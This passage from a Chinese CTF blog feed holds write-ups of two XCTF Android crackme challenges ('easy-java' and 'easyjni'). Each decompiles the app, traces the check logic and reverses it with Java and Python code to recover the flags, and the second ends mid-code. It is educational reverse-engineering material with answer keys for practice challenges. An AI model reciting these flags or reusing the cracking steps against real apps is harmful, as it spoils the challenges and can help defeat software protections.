Boolean.valueOf(sb.toString().equals(<span class="string">&quot;wigwrkaugala&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的代码我们可以确定密码形式应该为”flag{  }”，我们先来跟进a()和b()的代码逻辑，代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ArrayList&lt;Integer&gt; a = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">static</span> String b = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> Integer d = <span class="number">0</span>;</span><br><span class="line">    Integer[] c = &#123;<span class="number">8</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">7</span>, <span class="number">22</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">2</span>, <span class="number">24</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">13</span>&#125;;<span class="comment">//c.length()为28</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">b</span><span class="params">(Integer num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> intValue = num.intValue(); intValue &lt; <span class="keyword">this</span>.c.length; intValue++) &#123;</span><br><span class="line">            a.add(<span class="keyword">this</span>.c[intValue]);<span class="comment">//循环往列表a中添加键值对</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num.intValue(); i++) &#123;</span><br><span class="line">            a.add(<span class="keyword">this</span>.c[i]);<span class="comment">//循环往a中添加键值对</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> intValue = a.get(<span class="number">0</span>).intValue();<span class="comment">//intvalue=8</span></span><br><span class="line">        a.remove(<span class="number">0</span>);<span class="comment">//删除列表中索引为0</span></span><br><span class="line">        a.add(Integer.valueOf(intValue));<span class="comment">//列表a加上8</span></span><br><span class="line">        b += <span class="string">&quot;&quot;</span> + b.charAt(<span class="number">0</span>);<span class="comment">//b=&quot;abcdefghijklmnopqrstuvwxyza&quot;</span></span><br><span class="line">        b = b.substring(<span class="number">1</span>, <span class="number">27</span>);<span class="comment">//b=&quot;bcdefghijklmnopqrstuvwxyza&quot;</span></span><br><span class="line">        Integer num = d;</span><br><span class="line">        d = Integer.valueOf(d.intValue() + <span class="number">1</span>); <span class="comment">//d=1</span></span><br><span class="line">    &#125;<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">a</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (b.contains(str.toLowerCase())) &#123;<span class="comment">//判断b中是否存在小写的str字符串</span></span><br><span class="line">            Integer valueOf = Integer.valueOf(b.indexOf(str));</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i2 = <span class="number">0</span>; i2 &lt; a.size() - <span class="number">1</span>; i2++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (a.get(i2) == valueOf) &#123;</span><br><span class="line">                    i = Integer.valueOf(i2);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            i = str.contains(<span class="string">&quot; &quot;</span>) ? -<span class="number">10</span> : -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        a();</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">b</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> d;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> ArrayList&lt;Integer&gt; a = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">static</span> String b = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> Integer d = <span class="number">0</span>;</span><br><span class="line">    Integer[] c = &#123;<span class="number">7</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">4</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">20</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">19</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">1</span>, <span class="number">8</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">a</span><span class="params">(Integer num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> intValue = num.intValue(); intValue &lt; <span class="keyword">this</span>.c.length; intValue++) &#123;</span><br><span class="line">            a.add(<span class="keyword">this</span>.c[intValue]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num.intValue(); i++) &#123;</span><br><span class="line">            a.add(<span class="keyword">this</span>.c[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Integer num = d;</span><br><span class="line">        d = Integer.valueOf(d.intValue() + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (d.intValue() == <span class="number">25</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> intValue = a.get(<span class="number">0</span>).intValue();</span><br><span class="line">            a.remove(<span class="number">0</span>);</span><br><span class="line">            a.add(Integer.valueOf(intValue));</span><br><span class="line">            d = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">a</span><span class="params">(Integer num)</span> </span>&#123;</span><br><span class="line">        Integer num2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (num.intValue() == -<span class="number">10</span>) &#123;</span><br><span class="line">            a();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot; &quot;</span>.charAt(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; a.size() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a.get(i) == num) &#123;</span><br><span class="line">                num2 = Integer.valueOf(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        a();</span><br><span class="line">        <span class="keyword">return</span> b.charAt(num2.intValue());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>a和b这两个类的构造函数是对各自的列表重新进行变化得到新的列表</p>
<p>我们来总结下正向计算步骤:</p>
<ul>
<li>主代码调用：调用b.a(str)，在调用a.a(str)</li>
<li>将MainActivity.a()循环多次后得到字符串”wigwrkaugala”</li>
</ul>
<h2 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h2><ul>
<li>先对a.a(str)逆向反推，再对b.a(str)逆向反推</li>
</ul>
<p>a.a的逆向分析代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public int re_a(char args)</span><br><span class="line">    &#123;</span><br><span class="line">        return (int) a.a.get(a.b.indexOf(args));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>b.a的逆向代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public char re_a(int args)</span><br><span class="line">    &#123;</span><br><span class="line">        char c = b.b.charAt(b.a.get(args));</span><br><span class="line">        return c;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>逆向代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">app_java</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        b b1 = <span class="keyword">new</span> b;</span><br><span class="line">        a a1 = <span class="keyword">new</span> a(<span class="number">3</span>);</span><br><span class="line">        String enflag = <span class="string">&quot;wigwrkaugala&quot;</span>;</span><br><span class="line">        String flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;enflag.length();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            flag += b1.re_a(a1.re_a(enflag.charAt(i)));</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(flag);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到如下字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">venividivkcr</span><br></pre></td></tr></table></figure>

<p>加上”flag{}”则为”flag{venividivkcr}”</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Beasy-java/image-20231031131515757.png" class title="image-20231031131515757">]]></content>
      <categories>
        <category>CTF</category>
        <category>Mobile</category>
      </categories>
      <tags>
        <tag>-CTF -Mobile</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Moblie系列之easyjni</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Beasyjni/</url>
    <content><![CDATA[<h1 id="【攻防世界】Mobile系列之easyjni"><a href="#【攻防世界】Mobile系列之easyjni" class="headerlink" title="【攻防世界】Mobile系列之easyjni"></a>【攻防世界】Mobile系列之easyjni</h1><p>程序运行如下图所示，输入字符进行检查</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Beasyjni/image-20231129101506604.png" class title="image-20231129101506604">

<p>经检测没有进行加壳处理</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Beasyjni/image-20231129101940979.png" class title="image-20231129101940979">

<p>使用jadx反编译获取其源代码，定位入口点MainActivity()源代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">c</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;native&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: private */</span></span><br><span class="line">    <span class="comment">/* access modifiers changed from: public */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">a</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ncheck(<span class="keyword">new</span> a().a(str.getBytes()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">boolean</span> <span class="title">ncheck</span><span class="params">(String str)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.support.v4.a.aa, android.support.v4.a.i, android.support.v7.app.c</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        findViewById(R.id.button).setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="comment">/* class com.a.easyjni.MainActivity.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (MainActivity.<span class="keyword">this</span>.a((MainActivity) ((EditText) ((MainActivity) <span class="keyword">this</span>).findViewById(R.id.edit)).getText().toString())) &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;You are right!&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;You are wrong! Bye~&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里就是调用了so层的native文件对输入进行了判断，我们来继续跟踪native.so文件的ncheck()方法，使用IDEA打开反编译获取其源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __fastcall <span class="title">Java_com_a_easyjni_MainActivity_ncheck</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// r6</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">bool</span> v10; <span class="comment">// cc</span></span><br><span class="line">  _BOOL4 result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> v12[<span class="number">32</span>]; <span class="comment">// [sp+3h] [bp-35h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [sp+23h] [bp-15h]</span></span><br><span class="line"></span><br><span class="line">  v5 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(*(<span class="keyword">int</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="number">676</span>))(a1, a3, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v5) == <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">16</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = &amp;v12[i];</span><br><span class="line">      v12[i] = v5[i + <span class="number">16</span>];</span><br><span class="line">      v8 = v5[i];</span><br><span class="line">      v7[<span class="number">16</span>] = v8;</span><br><span class="line">    &#125;</span><br><span class="line">    (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span> *))(*(_DWORD *)a1 + <span class="number">680</span>))(a1, a3, v5);</span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = v9 &lt; <span class="number">30</span>;</span><br><span class="line">      v13 = v12[v9];</span><br><span class="line">      v12[v9] = v12[v9 + <span class="number">1</span>];</span><br><span class="line">      v12[v9 + <span class="number">1</span>] = v13;</span><br><span class="line">      v9 += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v10 );</span><br><span class="line">    result = <span class="built_in">memcmp</span>(v12, <span class="string">&quot;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&quot;</span>, <span class="number">0x20</span>u) == <span class="number">0</span>; <span class="comment">//将v12和&quot;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&quot;前0x20字节作比较</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    (*(<span class="keyword">void</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span> *))(*(_DWORD *)a1 + <span class="number">680</span>))(a1, a3, v5);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将上面的代码整理下，关键代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">16</span>; ++i )</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="comment">//v7 = &amp;v12[i];</span></span><br><span class="line">     v12[i] = key_chars[i + <span class="number">16</span>];</span><br><span class="line">     tmp = key_chars[i];</span><br><span class="line">     v12[i+<span class="number">16</span>] = tmp;</span><br><span class="line">   &#125;</span><br><span class="line">   (*nev)-&gt;ReleaseStringUTFChars(nev, key, key_chars);</span><br><span class="line">   </span><br><span class="line">   i = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">do</span></span><br><span class="line">   &#123;</span><br><span class="line">     v10 = i &lt; <span class="number">30</span>;</span><br><span class="line">     tmp = v12[i];</span><br><span class="line">     v12[i] = v12[i + <span class="number">1</span>];</span><br><span class="line">     v12[i + <span class="number">1</span>] = tmp;</span><br><span class="line">     i += <span class="number">2</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">while</span> ( v10 );</span><br><span class="line">   <span class="keyword">return</span> <span class="built_in">memcmp</span>(v12, <span class="string">&quot;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&quot;</span>, <span class="number">0x20</span>u) == <span class="number">0</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>就是先将前16位与后16位相交换，然后两两交换，根据其逆向还原代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v12 = <span class="built_in">list</span>(<span class="string">&#x27;MbT3sQgX039i3g==AQOoMQFPskB1Bsc7&#x27;</span>)</span><br><span class="line">v9 = <span class="number">32</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,v9,<span class="number">2</span>):</span><br><span class="line">    v13 = v12[i]</span><br><span class="line">    v12[i] = v12[i + <span class="number">1</span>]</span><br><span class="line">    v12[i + <span class="number">1</span>] = v13</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line">s = v12[<span class="number">16</span>:<span class="number">31</span>]+v12[:<span class="number">15</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(s))</span><br></pre></td></tr></table></figure>

<p>得到Base64编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">QAoOQMPFks1BsB7bM3TQsXg30i9g3==</span><br></pre></td></tr></table></figure>

<p>这里对其解码需要用到源代码中的a类中的a方法，代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.a.easyjni;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span>[] a = &#123;<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;N&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">a</span><span class="params">(<span class="keyword">byte</span>[] bArr)</span> </span>&#123;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= bArr.length - <span class="number">1</span>; i += <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bArr2 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">byte</span> b = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i2 = <span class="number">0</span>; i2 &lt;= <span class="number">2</span>; i2++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i + i2 &lt;= bArr.length - <span class="number">1</span>) &#123;</span><br><span class="line">                    bArr2[i2] = (<span class="keyword">byte</span>) (b | ((bArr[i + i2] &amp; <span class="number">255</span>) &gt;&gt;&gt; ((i2 * <span class="number">2</span>) + <span class="number">2</span>)));</span><br><span class="line">                    b = (<span class="keyword">byte</span>) ((((bArr[i + i2] &amp; <span class="number">255</span>) &lt;&lt; (((<span class="number">2</span> - i2) * <span class="number">2</span>) + <span class="number">2</span>)) &amp; <span class="number">255</span>) &gt;&gt;&gt; <span class="number">2</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bArr2[i2] = b;</span><br><span class="line">                    b = <span class="number">64</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            bArr2[<span class="number">3</span>] = b;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i3 = <span class="number">0</span>; i3 &lt;= <span class="number">3</span>; i3++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (bArr2[i3] &lt;= <span class="number">63</span>) &#123;</span><br><span class="line">                    sb.append(a[bArr2[i3]]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    sb.append(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就是一个自定义字典的Base64编码，所以需要利用这个字典对其进行解码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">base64_charset = [<span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;X&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;x&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;N&#x27;</span>]</span><br><span class="line">base64_charset = <span class="string">&quot;&quot;</span>.join(base64_charset)</span><br><span class="line"><span class="built_in">print</span>(base64_charset)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Base64NewDecode</span>(<span class="params">string</span>):</span></span><br><span class="line">    base64_bytes = [<span class="string">&quot;&#123;:0&gt;6&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(base64_charset.index(c))).replace(<span class="string">&#x27;0b&#x27;</span>, <span 